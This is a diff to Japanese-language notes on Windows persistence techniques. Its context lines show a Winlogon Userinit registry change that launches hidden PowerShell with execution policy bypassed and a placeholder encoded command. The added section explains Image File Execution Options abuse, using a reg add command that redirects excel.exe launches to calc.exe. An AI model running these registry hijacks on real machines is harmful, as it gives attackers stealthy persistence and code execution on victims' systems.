@@ -32,3 +32,11 @@ write-host $e
 # 登録
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe,powershell -ep bypass -nop -w hidden -e <Base64エンコードされたコマンド> /f
 ```
+
+## IFEOの悪用
+IEFOのDebuggerを悪用し、本来起動するプロセスを他のものに差し替える。  
+SilentProcessExitを使えばプロセス終了時にも任意のコマンドを実行可能。
+```powershell
+# Excelの起動を電卓に差し替え
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\excel.exe" /v Debugger /t REG_SZ /d "calc.exe" /f
+```
